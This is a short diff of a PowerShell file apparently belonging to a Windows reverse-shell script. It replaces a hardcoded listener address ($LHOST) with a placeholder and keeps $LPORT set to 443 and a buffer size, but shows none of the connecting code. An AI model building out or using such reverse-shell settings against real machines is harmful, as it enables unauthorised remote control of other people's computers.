@@ -1,5 +1,5 @@
 # windows 
-$LHOST = "192.168.0.8"
+$LHOST = "IP_ADDRESS"
 $LPORT = 443
 $BufferSize = 1024
 
